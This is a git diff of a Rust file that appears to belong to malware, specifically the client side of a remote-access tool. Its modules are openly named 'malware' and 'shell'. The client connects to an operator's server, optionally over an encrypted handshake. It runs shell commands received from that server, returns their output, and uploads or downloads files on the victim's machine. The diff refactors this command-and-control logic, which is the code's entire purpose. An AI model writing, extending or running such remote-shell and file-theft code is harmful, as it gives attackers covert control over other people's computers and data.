@@ -1,11 +1,10 @@
 use std::{env, fs::File, io::{Read, Write}, net::Shutdown};
-
 use bstr::ByteSlice;
 
 use crate::{
-    malware::{
-        Exploits,
-        HandleExploits,
+    Application::malware::utils::shell::{
+        ShellStream,
+        HandleShellStream,
     },
     stprotocol::{
         Client,
@@ -14,22 +13,57 @@ use crate::{
         Session,
     },
     structure::{
-        disconnect,
-        download,
-        enums::Packet,
-        exploit,
-        response,
-        structs::define::StructStone,
-        traits::define::Detector,
-        upload,
-    },
+        packet::{
+            disconnect,
+            download,
+            exploit,
+            response,
+            upload,
+        },
+        utils::{
+            enums::{
+                EncryptType,
+                HandshakeType,
+                Packet,
+            },
+            structs::{
+                define::{
+                    StructStone,
+                    EncryptionInfo
+                }
+            },
+            traits::define::Detector,
+        }
+    }
 };
 
+type Result<T> = std::io::Result<T>;
+
 impl Client {
-    pub fn new(ip: &str) -> Client {
+    pub fn new(session: Session) -> Client {
         Client {
-            session: Session::new(format!("{}:{}", ip, 6974).as_str()),
-            exploits: Exploits::default(),
+            session,
+            exploits: ShellStream::default(),
+        }
+    }
+    pub fn normal(ip: &str) -> Client {
+        Client {
+            session: Session::normal(ip.parse().unwrap()),
+            exploits: ShellStream::default(),
+        }
+    }
+
+    pub fn secure(ip: &str, handshake_type: HandshakeType, encrypt_type: EncryptType) -> Client {
+        Client {
+            session: Session::secure(
+                ip.parse().unwrap(),
+                EncryptionInfo {
+                    Activated: true,
+                    Type: encrypt_type,
+                    Handshake_Type: handshake_type,
+                }
+            ),
+            exploits: ShellStream::default(),
         }
     }
 
@@ -37,15 +71,17 @@ impl Client {
         self.session.receiving(StructStone::buffer())
     }
 
-    pub fn send(&mut self, packet: Packet) -> std::io::Result<&Packet> {
-        self.session.get_packet().display();
+    pub fn send(&mut self, packet: Packet) -> Result<Packet> {
         self.set_packet(packet);
-        self.session.send()
+        return match self.session.send() {
+            Ok(packet) => Ok(packet),
+            Err(error) => Err(error)
+        }
     }
 }
 
 impl HandleProtocols for Client {
-    fn response(&mut self, msg: &str) -> std::io::Result<&Packet> {
+    fn response(&mut self, msg: &str) -> Result<Packet> {
         self.set_packet(response(msg));
         self.session.send()
     }
@@ -59,8 +95,8 @@ impl HandleProtocols for Client {
             .expect("TODO: panic message");
     }
 
-    fn download(&mut self) -> std::io::Result<&Packet> {
-        let file_arr: &[u8] = self.take_file().as_slice();
+    fn download(&mut self) -> Result<Packet> {
+        let file_arr: &[u8] = self.session.packet.take_file().unwrap().as_slice();
         let mut fields: Vec<&[u8]> = file_arr.split_str("<name_end>").collect();
 
         let path = format!(
@@ -87,8 +123,8 @@ impl HandleProtocols for Client {
         self.session.send()
     }
 
-    fn upload(&mut self) -> std::io::Result<&Packet> {
-        let path = match String::from_utf8(self.get_file()) {
+    fn upload(&mut self) -> Result<Packet> {
+        let path = match String::from_utf8(self.session.packet.get_file()) {
             Ok(ok) => ok,
             Err(_) => return self.response("File Not Found"),
         };
@@ -107,8 +143,8 @@ impl HandleProtocols for Client {
         self.session.send()
     }
 
-    fn exploit(&mut self) -> std::io::Result<&Packet> {
-        self.exploits.execute(self.get_command());
+    fn exploit(&mut self) -> Result<Packet> {
+        self.exploits.execute(self.session.packet.get_command());
         let output = exploit(self.exploits.get_output());
         self.set_packet(output);
         self.session.send()
